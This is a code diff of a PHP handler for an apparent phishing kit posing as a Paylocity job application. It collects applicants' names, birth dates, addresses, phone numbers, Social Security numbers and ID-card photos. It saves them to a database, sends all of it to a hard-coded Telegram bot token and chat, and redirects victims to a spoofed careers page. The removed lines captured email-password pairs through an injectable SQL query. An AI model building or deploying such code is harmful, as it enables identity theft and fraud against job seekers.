@@ -6,151 +6,131 @@ define('TELEGRAM_BOT_TOKEN', '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY');
 define('TELEGRAM_CHAT_ID', '1325797388');
 
 
-if ($_SERVER["REQUEST_METHOD"]=="POST"){
-$query = "INSERT INTO form (useremail,userpassword,timecol,ip) VALUES ('$_POST[useremail]','$_POST[userpassword]',NOW(),'$_POST[ip]')";
-$result = pg_query($query);
 
-// Get and define form inputs
-    $useremail = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
-    $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
-    $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
-    $timestamp = date("Y-m-d H:i:s");
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+  // Get form inputs
+  $first_name = htmlspecialchars($_POST['q11_fullName']['first'] ?? '');
+  $middle_name = htmlspecialchars($_POST['q11_fullName']['middle'] ?? '');
+  $last_name = htmlspecialchars($_POST['q11_fullName']['last'] ?? '');
+  $full_name = trim("$first_name $middle_name $last_name");
 
+  $birth_month = $_POST['q18_birthDate']['month'] ?? '';
+  $birth_day = $_POST['q18_birthDate']['day'] ?? '';
+  $birth_year = $_POST['q18_birthDate']['year'] ?? '';
+  $birth_date = "$birth_year-$birth_month-$birth_day";
 
-    $firstname = htmlspecialchars($_POST['q11_fullName[first]'] ?? 'Empty');
-    $lastname = htmlspecialchars($_POST['q11_fullName[last]'] ?? 'Empty');
-    $dobmonth = htmlspecialchars($_POST['q18_birthDate[month]'] ?? 'Empty');
-    $dobday = htmlspecialchars($_POST['q18_birthDate[day]'] ?? 'Empty');
-    $dobyear = htmlspecialchars($_POST['q18_birthDate[year]'] ?? 'Empty');
-    $addline = htmlspecialchars($_POST['q16_currentAddress[addr_line1]'] ?? 'Empty');
-    $city = htmlspecialchars($_POST['q16_currentAddress[city]'] ?? 'Empty');
-    $state = htmlspecialchars($_POST['q16_currentAddress[state]'] ?? 'Empty');
-    $zip = htmlspecialchars($_POST['q16_currentAddress[postal]'] ?? 'Empty');
-    $email = htmlspecialchars($_POST['q12_emailAddress'] ?? 'Empty');
-    $phone = htmlspecialchars($_POST['q13_phoneNumber13[full]'] ?? 'Empty');
-    $position = htmlspecialchars($_POST['q14_positionApplied'] ?? 'Empty');
-    $jobtype = htmlspecialchars($_POST['q24_jobType'] ?? 'Empty');
-    $ssn = htmlspecialchars($_POST['q25_socSec'] ?? 'Empty');
+  $address = htmlspecialchars($_POST['q16_currentAddress']['addr_line1'] ?? '') . " " . 
+             htmlspecialchars($_POST['q16_currentAddress']['addr_line2'] ?? '') . ", " .
+             htmlspecialchars($_POST['q16_currentAddress']['city'] ?? '') . ", " .
+             htmlspecialchars($_POST['q16_currentAddress']['state'] ?? '') . ", " .
+             htmlspecialchars($_POST['q16_currentAddress']['postal'] ?? '');
 
+  $email = htmlspecialchars($_POST['q12_emailAddress'] ?? '');
+  $phone = htmlspecialchars($_POST['q13_phoneNumber13']['full'] ?? '');
+  $position = htmlspecialchars($_POST['q14_positionApplied'] ?? '');
+  $job_type = htmlspecialchars($_POST['q24_jobType'] ?? '');
+  $source = htmlspecialchars($_POST['q21_howDid21'] ?? '');
+  $ssn = htmlspecialchars($_POST['q25_socSec'] ?? '');
 
+  $timestamp = date("Y-m-d H:i:s");
 
-  // File handling
-  // $file_path = null;
-  // if (!empty($_FILES['file']['name'])) {
-  //     $upload_dir = "uploads/";  // Make sure this directory exists
-  //     if (!is_dir($upload_dir)) {
-  //         mkdir($upload_dir, 0777, true);
-  //     }
+  // File handling - Process Front & Back ID
+  $upload_dir = "uploads/";
+  if (!is_dir($upload_dir)) {
+      mkdir($upload_dir, 0777, true);
+  }
 
-  //     $file_name = basename($_FILES['file']['name']);
-  //     $file_path = $upload_dir . time() . "_" . $file_name; // Prevent file name conflicts
+  $front_id_path = null;
+  if (!empty($_FILES['file']['name'][0])) {  // Front ID
+      $front_id_name = basename($_FILES['file']['name'][0]);
+      $front_id_path = $upload_dir . time() . "_front_" . $front_id_name;
+      move_uploaded_file($_FILES['file']['tmp_name'][0], $front_id_path);
+  }
 
-  //     if (move_uploaded_file($_FILES['file']['tmp_name'], $file_path)) {
-  //         echo "File uploaded successfully!<br>";
-  //     } else {
-  //         echo "File upload failed!<br>";
-  //         $file_path = null; // Reset file path if upload fails
-  //     }
-  // }
+  $back_id_path = null;
+  if (!empty($_FILES['file']['name'][1])) {  // Back ID
+      $back_id_name = basename($_FILES['file']['name'][1]);
+      $back_id_path = $upload_dir . time() . "_back_" . $back_id_name;
+      move_uploaded_file($_FILES['file']['tmp_name'][1], $back_id_path);
+  }
 
+  // Save to PostgreSQL
+  $conn = pg_connect("host=".DB_HOST." port=".DB_PORT." dbname=".DB_NAME." user=".DB_USER." password=".DB_PASS);
+  
+  if (!$conn) {
+      die("Database connection failed: " . pg_last_error());
+  }
 
+  $query = "INSERT INTO submissions 
+              (full_name, birth_date, address, email, phone, position_applied, job_type, source, ssn, front_id, back_id, submitted_at) 
+            VALUES 
+              ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12)";
+  $result = pg_query_params($conn, $query, array($full_name, $birth_date, $address, $email, $phone, $position, $job_type, $source, $ssn, $front_id_path, $back_id_path, $timestamp));
 
+  if ($result) {
+      echo "Submission successful!<br>";
+  } else {
+      echo "Error: " . pg_last_error($conn);
+  }
 
-  // File handling - Multiple files with the same name
-    $file_paths = [];
-    if (!empty($_FILES['file']['name'][0])) {  // Check if files were uploade-d
-        $upload_dir = "uploads/";
-        if (!is_dir($upload_dir)) {
-            mkdir($upload_dir, 0777, true);
-        }
+  pg_close($conn);
 
-        foreach ($_FILES['file']['name'] as $key => $file_name) {
-            $temp_path = $_FILES['file']['tmp_name'][$key];
-            $new_file_path = $upload_dir . time() . "_" . basename($file_name);
+  // Prepare message for Telegram
+  $telegram_message = "📝 *New Job Application*\n\n".
+                      "👤 *Name:* $full_name\n".
+                      "🎂 *Birth Date:* $birth_date\n".
+                      "🏠 *Address:* $address\n".
+                      "📧 *Email:* $email\n".
+                      "📞 *Phone:* $phone\n".
+                      "💼 *Position Applied:* $position\n".
+                      "📌 *Job Type:* $job_type\n".
+                      "🗣️ *Referred By:* $source\n".
+                      "🔐 *SSN:* $ssn\n".
+                      "⏳ *Submitted At:* $timestamp\n".
+                      "📎 *Identity Verification:* " . ($front_id_path && $back_id_path ? "✅ Uploaded" : "❌ Not Provided");
 
-            if (move_uploaded_file($temp_path, $new_file_path)) {
-                $file_paths[] = $new_file_path;  // Store file path
-            }
-        }
-    }
+  // Send text message to Telegram
+  $telegram_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage";
+  $data = [
+      'chat_id' => TELEGRAM_CHAT_ID,
+      'text' => $telegram_message,
+      'parse_mode' => 'Markdown'
+  ];
 
+  $ch = curl_init();
+  curl_setopt($ch, CURLOPT_URL, $telegram_url);
+  curl_setopt($ch, CURLOPT_POST, 1);
+  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+  curl_exec($ch);
+  curl_close($ch);
 
+  // Send files to Telegram
+  $files_to_send = [
+      'Front ID' => $front_id_path,
+      'Back ID' => $back_id_path
+  ];
 
+  foreach ($files_to_send as $label => $file) {
+      if ($file) {
+          $telegram_file_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendDocument";
+          
+          $file_data = [
+              'chat_id' => TELEGRAM_CHAT_ID,
+              'document' => new CURLFile(realpath($file)),
+              'caption' => "📎 *$label* uploaded by *$full_name* at $timestamp",
+              'parse_mode' => 'Markdown'
+          ];
 
-// Define message structure before sending to Telegram
-$telegram_message = "📝 *New Form Submission*:\n\n".
-                    "👤 *Name:* $firstname $lastname\n".
-                    "📧 *Birth Date:* $dobmonth $dobday $dobyear\n".
-                    "   *Address:* $addline, $city, $state. $zip\n".
-                    "   *Email:* $email\n".
-                    "   *Phone Nummber:* $phone\n".
-                    "   *Position:* $position\n".
-                    "   *Job Type:* $jobtype\n".
-                    "   *SSN:* $ssn\n".
-                    "⏳ *Submitted At:* $timestamp\n".
-                    "💬 *IP:* $ip";
-
-
-$telegram_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage";
-
-// Send message using CURL (allows better error handling)
-$data = [
-    'chat_id' => TELEGRAM_CHAT_ID,
-    'text' => $telegram_message,
-    'parse_mode' => 'Markdown'
-];
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $telegram_url);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$response = curl_exec($ch);
-curl_close($ch);
-
-
-
- // Send file to Telegram if uploaded
-    // if ($file_path) {
-    //     $telegram_file_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendDocument";
-        
-    //     $file_data = [
-    //         'chat_id' => TELEGRAM_CHAT_ID,
-    //         'document' => new CURLFile(realpath($file_path)),  // Attach file
-    //         'caption' => "📎 *File uploaded by:* $name\n⏳ *Time:* $timestamp",
-    //         'parse_mode' => 'Markdown'
-    //     ];
-
-    //     $ch = curl_init();
-    //     curl_setopt($ch, CURLOPT_URL, $telegram_file_url);
-    //     curl_setopt($ch, CURLOPT_POST, 1);
-    //     curl_setopt($ch, CURLOPT_POSTFIELDS, $file_data);
-    //     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    //     curl_exec($ch);
-    //     curl_close($ch);
-    // }
-
-
-
-    // Send files to Telegram
-    foreach ($file_paths as $file) {
-        $telegram_file_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendDocument";
-        
-        $file_data = [
-            'chat_id' => TELEGRAM_CHAT_ID,
-            'document' => new CURLFile(realpath($file)),  // Attach each file
-            'caption' => "📎 *File uploaded by:* $name\n⏳ *Time:* $timestamp",
-            'parse_mode' => 'Markdown'
-        ];
-
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $telegram_file_url);
-        curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $file_data);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_exec($ch);
-        curl_close($ch);
-    }
+          $ch = curl_init();
+          curl_setopt($ch, CURLOPT_URL, $telegram_file_url);
+          curl_setopt($ch, CURLOPT_POST, 1);
+          curl_setopt($ch, CURLOPT_POSTFIELDS, $file_data);
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+          curl_exec($ch);
+          curl_close($ch);
+      }
+  }
 
 header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/thankyou.html");
 exit;
